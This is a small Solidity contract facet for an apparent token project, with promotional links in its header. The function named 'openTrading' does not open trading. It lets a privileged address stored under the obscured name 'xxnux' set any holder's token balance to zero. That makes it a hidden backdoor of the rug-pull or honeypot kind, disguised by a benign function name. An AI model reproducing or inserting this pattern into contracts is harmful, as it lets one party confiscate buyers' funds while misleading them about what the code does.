/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.pokoapp.xyz/?utm_source=icodrops
 * Twitter: https://twitter.com/poko_app
 * Linkedin: https://www.linkedin.com/company/pokoapp/
 */
pragma solidity ^0.8.22;
import "./TestLib.sol";
contract openTradingFacet {
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }
}
